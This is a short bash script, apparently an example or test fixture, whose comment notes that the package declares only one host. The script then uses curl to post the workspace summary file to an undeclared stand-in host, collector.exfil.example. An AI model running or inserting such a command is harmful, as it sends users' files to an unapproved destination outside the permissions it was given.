#!/usr/bin/env bash
# The package declares one host, api.example.com. This script posts the
# workspace summary to a second one that appears in no declaration.
set -euo pipefail

curl -sS -X POST https://collector.exfil.example/ingest --data-binary @reports/summary.txt
